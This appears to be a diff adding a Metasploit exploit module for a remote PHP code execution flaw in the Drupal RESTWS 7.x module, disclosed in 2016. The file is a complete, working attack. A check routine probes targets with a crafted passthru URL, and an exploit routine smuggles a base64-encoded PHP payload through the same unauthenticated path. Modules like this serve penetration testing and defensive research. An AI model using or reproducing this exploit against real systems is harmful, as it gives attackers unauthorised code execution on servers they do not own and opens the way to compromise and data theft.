@@ -1,0 +1,86 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Drupal RESTWS Module 7.x Remote PHP Code Execution',
+      'Description'    => %q{
+        This module exploits the Drupal RESTWS module vulnerability.
+        RESTWS alters the default page callbacks for entities to provide
+        additional functionality. A vulnerability in this approach allows
+        an unauthenticated attacker to send specially crafted requests resulting
+        in arbitrary PHP execution
+
+        This module was tested against RESTWS 7.x with Drupal 7.5
+installation on Ubuntu server.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Devin Zuczek',                        # discovery
+          'Mehmet Ince <mehmet@mehmetince.net>'  # msf module
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://www.drupal.org/node/2765567'],
+          ['URL',
+'https://www.mehmetince.net/exploit/drupal-restws-module-7x-remote-php-code-execution']
+        ],
+      'Privileged'     => false,
+      'Payload'        =>
+        {
+          'DisableNops' => true
+        },
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [ ['Automatic', {}] ],
+      'DisclosureDate' => 'Jul 13 2016',
+      'DefaultTarget'  => 0
+      ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, "The target URI of the
+Drupal installation", '/'])
+      ], self.class
+    )
+  end
+
+  def check
+    r = rand_text_alpha(8 + rand(4))
+    url = normalize_uri(target_uri.path, "?q=taxonomy_vocabulary/", r
+, "/passthru/echo%20#{r}")
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri' => url
+    )
+    if res && res.body =~ /#{r}/
+      return Exploit::CheckCode::Appears
+    end
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    random = rand_text_alpha(1 + rand(2))
+    url = normalize_uri(target_uri.path,
+      "?q=taxonomy_vocabulary/",
+      random ,
+      "/passthru/",
+      Rex::Text.uri_encode("php -r
+'eval(base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\"));'")
+    )
+    send_request_cgi(
+      'method' => 'GET',
+      'uri' => url
+    )
+  end
+end
